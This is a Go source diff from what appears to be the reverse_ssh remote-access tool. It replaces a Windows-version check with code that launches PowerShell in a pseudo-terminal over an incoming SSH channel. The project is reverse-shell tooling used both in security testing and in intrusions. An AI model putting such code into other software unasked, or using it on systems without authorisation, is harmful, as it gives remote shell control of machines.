@@ -11,11 +11,11 @@ import (
 
 	"github.com/ActiveState/termtest/conpty"
 	"github.com/NHAS/reverse_ssh/internal"
+	"github.com/NHAS/reverse_ssh/internal/client/shellhost"
 	"github.com/NHAS/reverse_ssh/internal/server/terminal"
 	"github.com/NHAS/reverse_ssh/internal/server/users"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/sys/windows"
 )
 
 //The basic windows shell handler, as there arent any good golang libraries to work with windows conpty
@@ -42,13 +42,19 @@ func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger
 		case "pty-req":
 			req.Reply(true, nil)
 
-			vsn := windows.RtlGetVersion()
-			if vsn.MajorVersion < 10 || vsn.BuildNumber < 17763 {
-				log.Info("Windows version too old for Conpty, using basic shell")
-				basicShell(log, connection)
-			} else {
-				ptyreq, _ := internal.ParsePtyReq(req.Payload)
-				conptyShell(requests, log, ptyreq, connection)
+			// vsn := windows.RtlGetVersion()
+			// if vsn.MajorVersion < 10 || vsn.BuildNumber < 17763 {
+			// 	log.Info("Windows version too old for Conpty, using basic shell")
+			// 	basicShell(log, connection)
+			// } else {
+			// 	ptyreq, _ := internal.ParsePtyReq(req.Payload)
+			// 	conptyShell(requests, log, ptyreq, connection)
+			// }
+
+			pwr, _ := exec.LookPath("powershell")
+			err := shellhost.Start_with_pty(pwr, connection)
+			if err != nil {
+				log.Error("%s", err)
 			}
 
 			connection.Close()
